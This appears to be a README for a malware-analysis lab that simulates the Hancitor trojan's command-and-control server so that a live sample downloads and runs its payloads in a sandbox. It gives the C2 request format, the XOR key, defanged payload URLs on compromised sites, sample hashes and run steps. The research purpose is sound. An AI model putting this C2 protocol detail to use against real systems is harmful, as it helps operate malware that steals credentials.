This use case aims to simulate the server side of Hancitor. 

!!!This simulation involves running malware. Only do this in a sandbox environment and if you know what you are doing!!!

Use Case description
---------------------
Imaginary C2 can be used to simulate the Hancitor download instructions and to simulate the hosting of the Hancitor payloads.

Upon execution, Hancitor fetches the public IP of the infected machine by connecting to the following (legitimate) IP-lookup URL:
http://api.ipify.org

After this request, Hancitor sends basic machine fingerprinting information to the C2 server. The response to this 'machine fingerprinting data send-in' contains download instructions.
This behavior is documented well in the following articles:
from Carbon Black: https://www.carbonblack.com/2016/11/23/calendar-reminder-youre-infected-hancitor-malware/
from Twitter user @0verfl0w_: https://0ffset.net/reverse-engineering/malware-analysis/reversing-hancitor-again/

An example HTTP request can be found in the packet capture shared by Twitter user @malware_traffic on his blog:
https://www.malware-traffic-analysis.net/2019/04/02/index.html

The example HTTP request looks as follows:
POST request to: xxxp://etsofevenghen.com4/forum.php 
POST contents (machine fingerprinting data): GUID=15568065842790665216&BUILD=11hjd03&INFO=LONGBOTTOM-PC @ LONGBOTTOM-PC\henry&IP=173.166.146.112&TYPE=1&WIN=6.1(x64)

POST response: base64-encoded (XOR-encrypted) download instructions. The base64 encoded data is encrypted with a XOR key (value '0x7A') (as documented in the above articles).
The formatted decoded response looks as follows:
	{l:
		xxxp://dokucenter.optitime.de/wp-content/plugins/auto-more-tag/1|
		xxxp://www.laxmigroup1986.com/wp-content/plugins/easy-responsive-tabs/1|
		xxxp://shawneklassen.com/wp-content/plugins/foobox-image-lightbox/1|
		xxxp://jointings.org/eng/wp-content/plugins/featurific-for-wordpress/1|
		xxxp://kitcross.ca/wp-content/plugins/autoptimize/1
	}{b:
		xxxp://dokucenter.optitime.de/wp-content/plugins/auto-more-tag/2|
		xxxp://www.laxmigroup1986.com/wp-content/plugins/easy-responsive-tabs/2|
		xxxp://shawneklassen.com/wp-content/plugins/foobox-image-lightbox/2|
		xxxp://jointings.org/eng/wp-content/plugins/featurific-for-wordpress/2|
		xxxp://kitcross.ca/wp-content/plugins/autoptimize/2
	}{r:
		xxxp://dokucenter.optitime.de/wp-content/plugins/auto-more-tag/3|
		xxxp://www.laxmigroup1986.com/wp-content/plugins/easy-responsive-tabs/3|
		xxxp://shawneklassen.com/wp-content/plugins/foobox-image-lightbox/3|
		xxxp://jointings.org/eng/wp-content/plugins/featurific-for-wordpress/3|
		xxxp://kitcross.ca/wp-content/plugins/autoptimize/3
	}
The URLs in the above decoded response contain payloads (which will be downloaded and executed by Hancitor). The letters refer to how the payload needs to be executed (e.g. in-memory or saved to disk).
According to the 'malware traffic analysis' blog entry, the payloads are: Pony, Evil Pony and Ursnif.

This use case will give the expected C2 responses such that Hancitor will download and execute the payloads.

Use Case prerequisites 
-----------------------
*This use case should be used in conjunction with the following Hancitor sample.
	MD5: f5f6cbbf839edd829468ad270ac44291 
	SHA1: 66ebda2b8a25c68afddd76aed014ff6ec6e35b77
	SHA256: 468200d4d207a7cc1df245b9670fcf9e3c491dd344643cd7edcf8a82f2cde214
*This use case has been tested in a windows 7 SP1, 64-bit virtual machine, with python 2.7 installed.
*(Set the system clock to April 2019 for optimal results).

How to run
----------
*Ensure you are in a sandbox environment (e.g. virtual throwaway machine) and have python 2.7 installed
*Copy the redirect_config.txt and requests_config.txt to imaginary C2's folder
*Copy the files in server_data to imaginary C2's server_data folder.
*(Optionally: disable your network adapter, no internet connectivity is needed since Imaginary C2 simulates everything)
*Run imaginary C2's redirect_to_imaginary_c2.bat file (as administrator)
*Run imaginary C2's launch_imaginary_c2_server.bat
*Run Hancitor (SHA1 above). You should see connections appearing in the imaginary C2's commmandline window.
*If all works correctly, you will see the Hancitor sample spawning a svchost process and a process which belongs to the the dropped ursnif executable